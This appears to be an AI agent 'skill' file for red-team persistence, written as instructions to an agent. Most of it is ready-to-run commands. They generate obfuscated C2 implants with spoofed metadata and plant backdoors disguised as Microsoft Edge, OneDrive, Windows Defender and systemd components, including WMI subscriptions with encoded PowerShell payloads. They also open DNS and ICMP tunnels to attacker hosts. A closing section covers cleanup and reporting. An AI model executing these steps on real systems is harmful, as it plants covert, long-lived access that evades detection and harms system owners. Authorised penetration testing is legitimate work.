---
name: red-persistence
description: "Red team persistence. Redundant multi-protocol C2 beacons, OS-level persistence mechanisms (Windows/Linux), covert channels, OPSEC-hardened implant profiles, beacon jitter configuration, engagement close procedure, final attack-path assembly and executive report preparation. Triggers: 'red persistence', 'backdoor', 'covert channel', 'scheduled task', 'registry persistence', 'phantom persistence', 'c2 persistence', 'redundant beacon', 'engagement close'."
version: 2.0.0
phase: ["exploitation"]
category: ["exploitation"]
tools: ["phantom", "impacket", "sliver", "havoc"]
tags: ["red-team", "persistence", "backdoor", "covert", "c2", "implant", "evasion", "redundancy", "engagement-close"]
---

# Red Team — Persistence

You are establishing long-term, covert access. The goal is survivability: if one channel is detected and burned, access is not lost.

**Before every persistence mechanism:**
```
MECHANISM:    What specific persistence is being established?
FOOTPRINT:    Does this write to disk? Modify registry? Create scheduled task?
DETECTION:    Which event IDs / EDR signatures could fire?
REDUNDANCY:   Is this a primary or fallback channel?
CLEANUP:      How is this removed at engagement end?
EVIDENCE:     What artifact proves persistence is established?
```

Deploy at minimum 3 independent persistence mechanisms across different layers.

---

## Phase 1: Phantom C2 Redundant Beacons

Deploy multiple Phantom implant profiles with different protocols. One listener burning does not equal access loss.

### Primary — mTLS (strongest auth, corporate environment)

```bash
./phantom-client
generate --mtls <teamserver-ip>:8888 \
  --os windows --arch amd64 \
  --format exe \
  --evasion --obfuscate \
  --spoof-metadata /path/to/donor.exe \
  --save /tmp/persistence/primary/
```

### Fallback 1 — HTTPS (blends with web traffic)

```bash
generate --http <teamserver-ip>:443 \
  --os windows --arch amd64 \
  --format exe \
  --evasion --obfuscate \
  --spoof-metadata /path/to/donor.exe \
  --save /tmp/persistence/fallback-https/
```

### Fallback 2 — DNS (survives egress filtering)

```bash
generate --dns <c2-domain> \
  --os windows --arch amd64 \
  --format shellcode \
  --shellcode-encoder shikata-ga-nai \
  --evasion --obfuscate \
  --save /tmp/persistence/fallback-dns/
```

Deploy via existing session (no disk write if possible):
```bash
tmux send-keys -t phantom-server:client 'use <session-id>' Enter
tmux send-keys -t phantom-server:client \
  'execute-assembly /tmp/persistence/primary/implant.exe' Enter
```

Set beacon interval with jitter on all sessions:
```bash
tmux send-keys -t phantom-server:client 'set beacon-interval 300' Enter
tmux send-keys -t phantom-server:client 'set beacon-jitter 120' Enter
```

---

## Phase 2: OS-Level Persistence

Combine with C2 beacons for depth. Use OS mechanisms that survive C2 takedown.

### Windows — Scheduled Task (blends with legitimate tasks)

```bash
tmux send-keys -t phantom-server:client 'shell' Enter

schtasks /create \
  /tn "MicrosoftEdgeUpdateTaskMachineCore" \
  /tr "C:\ProgramData\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" \
  /sc hourly /mo 4 /ru SYSTEM /f

schtasks /query /tn "MicrosoftEdgeUpdateTaskMachineCore"
```

### Windows — Registry Run Key

```bash
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" \
  /v "OneDriveSync" /t REG_SZ \
  /d "C:\Users\<user>\AppData\Roaming\OneDriveSync\sync.exe" /f

reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
```

### Windows — WMI Event Subscription (fileless)

```bash
$FilterArgs = @{
  Name = "MicrosoftUpdater"
  EventNameSpace = "root\CimV2"
  QueryLanguage = "WQL"
  Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 220"
}
$Filter = New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs

$ConsumerArgs = @{
  Name = "MicrosoftUpdater"
  CommandLineTemplate = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -EncodedCommand <base64-payload>"
}
$Consumer = New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs

New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property @{
  Filter = [Ref]$Filter
  Consumer = [Ref]$Consumer
}
```

### Windows — Service

```bash
sc create "WindowsDefenderATP" \
  binpath= "C:\Windows\System32\svchost.exe -k netsvcs -p" \
  start= auto displayname= "Windows Defender ATP" type= own

reg add "HKLM\SYSTEM\CurrentControlSet\Services\WindowsDefenderATP\Parameters" \
  /v ServiceDll /t REG_EXPAND_SZ \
  /d "C:\Windows\System32\<payload>.dll" /f

sc start WindowsDefenderATP
```

### Linux — Crontab

```bash
(crontab -l 2>/dev/null; echo "*/15 * * * * /usr/lib/systemd/systemd-update --quiet") | crontab -
crontab -l
```

### Linux — Systemd Unit (survives reboot)

```bash
cat > /etc/systemd/system/systemd-update.service << 'EOF'
[Unit]
Description=systemd Update Manager

[Service]
ExecStart=/usr/lib/systemd/systemd-update
Restart=always
RestartSec=300

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable systemd-update
systemctl start systemd-update
```

### Linux — SSH Authorized Key

```bash
mkdir -p ~/.ssh && chmod 700 ~/.ssh
echo "ssh-ed25519 AAAA<operator-pubkey> operator@engagement" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

---

## Phase 3: Covert Channels (Egress-Restricted Environments)

Use when standard HTTP/S and mTLS are blocked.

DNS tunnel:
```bash
iodine -f -P <password> <attacker-dns-domain>
```

ICMP tunnel:
```bash
ptunnel-ng -p <target-ip> -lp 8080 -r <attacker-ip> -rp 4444
```

---

## Phase 4: Beacon Hardening

Every active session must have these configured before leaving the engagement unattended.

```bash
for session in $(tmux send-keys -t phantom-server:client 'sessions' Enter && sleep 1 && \
  tmux capture-pane -t phantom-server:client -p | grep "active" | awk '{print $1}'); do

  tmux send-keys -t phantom-server:client "use $session" Enter
  tmux send-keys -t phantom-server:client "set beacon-interval 300" Enter
  tmux send-keys -t phantom-server:client "set beacon-jitter 120" Enter
  sleep 1

done
```

Log persistence finding in Phantom:
```bash
tmux send-keys -t phantom-server:client \
  'engagements add-finding <eng-id> \
  --title "C2 Persistence — Multi-Protocol Redundant Beacons" \
  --severity high \
  --host <target-host> \
  --evidence "Primary mTLS + HTTPS fallback + DNS fallback deployed. OS-level: scheduled task + registry run key + WMI subscription."' Enter
```

---

## Phase 5: Final Attack-Path Assembly

Consolidate all attack-path nodes and edges from red-recon, red-exploit, red-lateral, and red-persistence into a single complete graph.

```json
{
  "engagement_id": "<id>",
  "objective": "<engagement objective>",
  "objective_achieved": true,
  "attack_path": {
    "nodes": [
      { "node_id": "N-RT-000", "type": "exposure",          "description": "External attack surface",           "evidence_level": 1, "confirmed": true },
      { "node_id": "N-RT-001", "type": "access",            "description": "Initial access via credential spray", "evidence_level": 3, "confirmed": true },
      { "node_id": "N-RT-002", "type": "weakness",          "description": "ADCS ESC1 — DA cert obtained",      "evidence_level": 4, "confirmed": true },
      { "node_id": "N-RT-003", "type": "control_bypass",    "description": "DCSync — all domain hashes",        "evidence_level": 4, "confirmed": true },
      { "node_id": "N-RT-004", "type": "sensitive_function","description": "Golden ticket — persistent DA",      "evidence_level": 5, "confirmed": true },
      { "node_id": "N-RT-005", "type": "impact",            "description": "Full domain compromise + persistence","evidence_level": 5, "confirmed": true }
    ],
    "edges": [
      { "from": "N-RT-000", "to": "N-RT-001", "description": "Credential spray on exposed OWA", "confirmed": true },
      { "from": "N-RT-001", "to": "N-RT-002", "description": "NTLM relay to ADCS ESC1", "confirmed": true },
      { "from": "N-RT-002", "to": "N-RT-003", "description": "DA cert → DCSync", "confirmed": true },
      { "from": "N-RT-003", "to": "N-RT-004", "description": "krbtgt hash → Golden Ticket", "confirmed": true },
      { "from": "N-RT-004", "to": "N-RT-005", "description": "Persistent DA + multi-protocol C2", "confirmed": true }
    ]
  }
}
```

Save to `.omop/red-team/<engagement>/attack-path-final.json`.

---

## Phase 6: Engagement Close Procedure

Before ending the engagement, clean up and export evidence.

Phantom audit export:
```bash
tmux send-keys -t phantom-server:client 'audit' Enter
tmux send-keys -t phantom-server:client 'audit --since <start-date>' Enter
tmux capture-pane -t phantom-server:client -p > persistence/phantom-audit.txt

tmux send-keys -t phantom-server:client 'engagements findings <eng-id>' Enter
tmux capture-pane -t phantom-server:client -p > persistence/phantom-findings.json
```

Remove persistence (only when explicitly instructed by client):
```bash
schtasks /delete /tn "MicrosoftEdgeUpdateTaskMachineCore" /f
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "OneDriveSync" /f

tmux send-keys -t phantom-server:client 'use <session-id>' Enter
tmux send-keys -t phantom-server:client 'rm -f /tmp/implant.exe' Enter
```

Evidence package:
```bash
tar -czf .omop/red-team/<engagement>/evidence-package-<date>.tar.gz \
  .omop/red-team/<engagement>/

sha256sum .omop/red-team/<engagement>/evidence-package-<date>.tar.gz > \
  .omop/red-team/<engagement>/evidence-package-<date>.sha256
```

---

## OPSEC Checklist — Final

- [ ] At least 3 persistence mechanisms across different layers
- [ ] At least 2 C2 protocols deployed (primary + fallback)
- [ ] All beacons have interval + jitter configured
- [ ] No beacon using default check-in interval
- [ ] Per-binary asymmetric keys enforced (Phantom default)
- [ ] Implants spoofed as legitimate PE metadata where written to disk
- [ ] Audit log exported from Phantom
- [ ] Attack-path JSON finalized and complete
- [ ] Persistence cleanup list documented for engagement close

---

## Output

```
.omop/red-team/<engagement>/persistence/
  persistence-log.txt
  phantom-sessions.txt
  phantom-findings.json
  phantom-audit.txt
  covert-channels.txt
  cleanup-procedure.txt

.omop/red-team/<engagement>/
  attack-path-final.json
  evidence-package-<date>.tar.gz
  evidence-package-<date>.sha256
```

## Next Skill

`pentest-report` — generate executive report from `attack-path-final.json` and evidence package.
